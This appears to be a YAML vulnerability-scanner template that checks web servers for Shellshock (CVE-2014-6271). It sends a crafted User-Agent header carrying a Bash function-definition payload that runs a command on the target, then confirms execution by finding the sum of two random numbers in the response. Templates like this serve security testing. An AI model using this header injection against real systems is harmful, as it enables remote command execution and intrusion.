name: poc-yaml-bash-cve-2014-6271
set:
  r1a: randomInt(800000000, 1000000000)
  r2a: randomInt(800000000, 1000000000)
rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        User-Agent: "() { :; }; echo; echo; /bin/bash -c 'expr {{r1a}} + {{r2a}}'"
      follow_redirects: false
    expression: response.body.bcontains(bytes(string(r1a + r2a)))
expression: r0()
detail:
  links:
    - https://vulhub.org/#/environments/bash/CVE-2014-6271/ Bash<4.3 没复现成功过